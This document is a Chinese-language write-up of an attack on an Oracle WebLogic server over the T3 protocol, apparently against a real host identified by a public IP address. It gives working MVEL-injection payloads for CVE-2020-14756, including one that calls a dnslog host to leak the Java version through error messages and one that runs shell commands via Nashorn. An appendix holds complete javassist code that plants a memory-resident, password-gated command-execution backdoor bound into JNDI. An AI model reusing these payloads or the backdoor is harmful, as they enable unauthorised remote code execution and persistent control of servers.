# 某weblogic T3攻击手法分享

## 探测

科长使用自己的扫描器，探测开放T3端口以及cve-2020-2551漏洞，但是怎么攻击都没反应。于是首先下载对方的黑名单类，反编译看一下

http://122.225.26.90:8091/bea_wls_internal/classes/weblogic/utils/io/oif/WebLogicFilterConfig.class

这种原本是codebase，用于在T3等通信的时候，如果对方没有该类，则通过codebase地址，去weblogic服务器下载相应的类。深入一下，也可以用来下载weblogic的黑名单类，用于查看目标服务器到底都开启了什么补丁

补丁截图

![img](https://app.yinxiang.com/FileSharing.action?hash=1/bc7e42d56f6f18bbdf7e9d701ec54149-42812)

## 攻击

我们可以根据黑名单列表，发现14756这个反序列化的漏洞没有修复，我们去网上找一个exp

14756原理不再介绍，payload是mvel表达式注入，但是这里的mvel表达式注入，不能申请变量等，而且手头也没有回显，mvel表达式注入的payload。

首先通过mvel表达式中执行ping dnslog的方式判断是否出网。结论是不出网。

如果实现T3回显，则需要在weblogic服务器上加载我们自己的恶意类，看来这条路先暂时停一下。我们可以通过报错的方式获取部分结果。代码中抛出异常，并且错误信息正好是我们的结果，这样也可以间接实现回显。

> 注意 这里一定要用T3协议，因为T3协议将会把错误信息完整的返回给客户端以供开发者查阅，而IIOP协议并不会这样。

payload如下，因为urlclassloader肯定无法连接目标服务器，这时候如果调用loadclass的话，则会报错，错误信息为class类名 + not found之类

```

MvelExtractor extractor = new MvelExtractor("new [java.net.URLClassLoader(new](http://java.net.urlclassloader(new/)

[java.net.URL](http://java.net.url/)[]{new

[java.net.URL](http://java.net.url/)(\"[http://zuib7j.dnslog.cn:10000](http://zuib7j.dnslog.cn:10000/)\")}).loadClass(System.getProperty(\"java.version\"));");

```

通过这种方式我们判断他的weblogic服务器运行在jdk1.8，也就是说我们可以通过mvel加载js代码，去执行我们的指令，突破更多限制。

![img](https://app.yinxiang.com/FileSharing.action?hash=1/d007dc0aea26727553473323458e880b-130436)

js脚本命令执行，同样通过报错信息拿到回显

```

MvelExtractor extractor = new MvelExtractor("new

javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(\"var scanner

= new

java.util.Scanner(java.lang.Runtime.getRuntime().exec(\\\"whoami\\\").getInputStream());var res = \\\"\\\";while (scanner.hasNextLine()){res = res +

scanner.nextLine();} throw new java.io.IOException(res);\");");

\```

weblogic为执行whoami的命令结果

![img](https://app.yinxiang.com/FileSharing.action?hash=1/86c063747d2d643d8d0f3c4584d047b3-226895)

下一步我们通过js加载javassist组装恶意类。js代码截图

![img](https://app.yinxiang.com/FileSharing.action?hash=1/cd75e14bf291b54aef7a7d5f80eea137-826661)

这里有个问题，js脚本需要处理各种字符转移问题，在这里我们直接用base64编解码，规避这个问题

payload

\```

String x = Base64.getEncoder().encodeToString(App.getJsCode().getBytes("utf-8"));MvelExtractor extractor = new MvelExtractor(String.format("new

javax.script.ScriptEngineManager().getEngineByName(\"nashorn\").eval(new

java.lang.String(java.util.Base64.getDecoder().decode(\"%s\"), \"utf-8\"));", x));

```

组装成功了，这里就是会报错

![img](https://app.yinxiang.com/FileSharing.action?hash=1/555ff3b3cf9f64575f2121cb2bd9052c-452016)

这样我们就在weblogic服务器上安装一个实例以供我们调用

实现命令执行

![img](https://app.yinxiang.com/FileSharing.action?hash=1/3bf0611dd72ea5b6577aa1c97216c79b-111350)

## 附录

js调用javaassist组装恶意类的代码

```

public static String getJsCode() {

​    return "print('Hello World!');" +

​        "var ClassPool = Java.type('javassist.ClassPool');\n" +

​        "var CtField = Java.type('javassist.CtField');\n" +

​        "var CtClass = Java.type('javassist.CtClass');\n" +

​        "var Modifier = Java.type('javassist.Modifier')\n" +

​        "var CtConstructor = Java.type('javassist.CtConstructor')\n" +

​        "var CtMethod = Java.type('javassist.CtMethod')\n" +

​        "\n" +

​        "var pool = ClassPool.getDefault();\n" +

​        "\n" +

​        "var cc = pool.makeClass(\"org.unicodesec.RemoteImpl\");\n" +

​        "cc.addInterface(pool.get(\"weblogic.cluster.singleton.ClusterMasterRemote\"));\n" +

​        "var param = new CtField(pool.get(\"java.lang.String\"), \"bindName\", cc);\n" +

​        "param.setModifiers(Modifier.PRIVATE);\n" +

​        "cc.addField(param, CtField.Initializer.constant(\"unicodeSec\"));\n" +

​        "\n" +

​        "var cons = new CtConstructor(null, cc);\n" +

​        "cons.setBody(\"{javax.naming.Context ctx = new javax.naming.InitialContext();\\n\" +\n" +

​        "  \"ctx.rebind(bindName, this);\\n\" +\n" +

​        "  \"System.out.println(\\\"installed\\\");}\");\n" +

​        "\n" +

​        "cc.addConstructor(cons);\n" +

​        "var setServerLocationM = new CtMethod(CtClass.voidType, \"setServerLocation\", [pool.get(\"java.lang.String\"), pool.get(\"java.lang.String\")], cc);\n" +

​        "setServerLocationM.setExceptionTypes([pool.get(\"java.rmi.RemoteException\")]);\n" +

​        "cc.addMethod(setServerLocationM);\n" +

​        "\n" +

​        "var getServerLocationM = new CtMethod(pool.get(\"java.lang.String\"), \"getServerLocation\", [pool.get(\"java.lang.String\")], cc);\n" +

​        "getServerLocationM.setExceptionTypes([pool.get(\"java.rmi.RemoteException\")]);\n" +

​        "getServerLocationM.setBody(\"{try {\\n\" +\n" +

​        "  \"      String cmd = $1;\\n\" +\n" +

​        "  \"      if (!cmd.startsWith(\\\"showmecode\\\")) {\\n\" +\n" +

​        "  \"        return \\\"guess me?\\\";\\n\" +\n" +

​        "  \"      } else {\\n\" +\n" +

​        "  \"        cmd = cmd.substring(10);\\n\" +\n" +

​        "  \"      }\\n\" +\n" +

​        "  \"\\n\" +\n" +

​        "  \"      boolean isLinux = true;\\n\" +\n" +

​        "  \"      String osTyp = System.getProperty(\\\"os.name\\\");\\n\" +\n" +

​        "  \"      if (osTyp != null && osTyp.toLowerCase().contains(\\\"win\\\")) {\\n\" +\n" +

​        "  \"        isLinux = false;\\n\" +\n" +

​        "  \"      }\\n\" +\n" +

​        "  \"      java.util.List cmds = new java.util.ArrayList();\\n\" +\n" +

​        "  \"\\n\" +\n" +

​        "  \"      if (cmd.startsWith(\\\"$NO$\\\")) {\\n\" +\n" +

​        "  \"        cmds.add(cmd.substring(4));\\n\" +\n" +

​        "  \"      } else if (isLinux) {\\n\" +\n" +

​        "  \"        cmds.add(\\\"/bin/bash\\\");\\n\" +\n" +

​        "  \"        cmds.add(\\\"-c\\\");\\n\" +\n" +

​        "  \"        cmds.add(cmd);\\n\" +\n" +

​        "  \"      } else {\\n\" +\n" +

​        "  \"        cmds.add(\\\"cmd.exe\\\");\\n\" +\n" +

​        "  \"        cmds.add(\\\"/c\\\");\\n\" +\n" +

​        "  \"        cmds.add(cmd);\\n\" +\n" +

​        "  \"      }\\n\" +\n" +

​        "  \"\\n\" +\n" +

​        "  \"      ProcessBuilder processBuilder = new ProcessBuilder(cmds);\\n\" +\n" +

​        "  \"      processBuilder.redirectErrorStream(true);\\n\" +\n" +

​        "  \"      Process proc = processBuilder.start();\\n\" +\n" +

​        "  \"\\n\" +\n" +

​        "  \"      java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(proc.getInputStream()));\\n\" +\n" +

​        "  \"      StringBuffer sb = new StringBuffer();\\n\" +\n" +

​        "  \"\\n\" +\n" +

​        "  \"      String line;\\n\" +\n" +

​        "  \"      while ((line = br.readLine()) != null) {\\n\" +\n" +

​        "  \"        sb.append(line).append(\\\"\\\\n\\\");\\n\" +\n" +

​        "  \"      }\\n\" +\n" +

​        "  \"\\n\" +\n" +

​        "  \"      return sb.toString();\\n\" +\n" +

​        "  \"    } catch (Exception e) {\\n\" +\n" +

​        "  \"      return e.getMessage();\\n\" +\n" +

​        "  \"    }}\");\n" +

​        "cc.addMethod(getServerLocationM);\n" +

​        "cc.setModifiers(Modifier.PUBLIC);\n" +

​        "cc.toClass().newInstance();";

  }

```